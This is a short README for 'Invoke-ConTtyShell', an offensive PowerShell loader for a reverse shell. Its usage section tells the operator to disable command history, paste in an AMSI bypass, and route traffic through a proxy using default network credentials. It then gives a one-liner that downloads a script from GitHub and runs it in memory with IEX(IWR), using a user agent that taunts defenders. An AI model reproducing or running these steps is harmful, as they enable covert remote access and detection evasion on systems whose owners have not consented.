# Invoke-ConTtyShell
.Net Assembly loader for the ConTtyShell


Tested on:
Windows 10 22H2 x64

Usage:

```
Set-PSReadlineOption -HistorySaveStyle SaveNothing

<Insert-Your-AMSI-Bypass-From-AMSI.FAIL-Here>

[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
# [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

[system.net.webrequest]::defaultwebproxy = new-object system.net.webproxy('http://proxy:8080')
[system.net.webrequest]::defaultwebproxy.BypassProxyOnLocal = $true
[system.net.webrequest]::defaultwebproxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials

# [system.net.webrequest]::defaultwebproxy.credentials = Get-Credential

IEX(IWR -UseBasicParsing -UserAgent "hi-there-blueteam" 'https://raw.githubusercontent.com/ricardojba/Invoke-ConTtyShell/main/Invoke-ConTtyShell.ps1')

Invoke-ConTtyShell -Command "-h"
```
